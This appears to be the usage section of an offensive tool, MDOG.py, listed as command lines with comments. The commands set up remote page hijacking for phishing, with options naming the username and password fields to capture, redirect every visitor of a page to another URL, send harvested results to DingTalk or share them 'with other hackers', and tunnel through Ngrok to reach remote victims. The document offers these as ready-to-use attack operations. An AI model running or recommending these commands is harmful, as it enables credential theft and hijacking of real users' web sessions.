python3 MDOG.py #Direct operation(Default port 8888，Do not enable hijacking module) 
python3 MDOG.py -lp 9999 #Set local listening port
python3 MDOG.py -lh 192.168.1.8 #Set local IP
python3 MDOG.py -rs -wsp 8889 #Set the Websocket port (use the - rs parameter with the hijacking module)
python3 MDOG.py -dcf #Use the contents in the configuration file to push the results to DingTalk
python3 MDOG.py -dt (DingTalk_Token) -dk (DingTalk_Keywords) #Fill in Token and keywords directly for Dingtalk push
python3 MDOG.py -rd (URL)  #Redirect all users accessing this page to the specified page
python3 MDOG.py -pu http(s)://(Target):(Object local port)/DATA # Share data results with other hackers
python3 MDOG.py -rs -wf (Local html file) -table -button (button Tag id) -user (username Tag id) -pass (password Tag id) #Remote host page hijacking for phishing
python3 MDOG.py -t -rbtcp (Ngrok TCP Tunnel) #Penetration for basic services
python3 MDOG.py -t -rwtcp (Ngrok TCP Tunnel) #Penetration for Websocket services
python3 MDOG.py -t -rbtcp (Ngrok TCP Tunnel)  -rwtcp (Ngrok TCP Tunnel) -rs -wf fs.html -table -button BT -user UA -pass PA #Remote page hijacking(There is no need to add the - rbtcp and - rwtcp parameters in the LAN)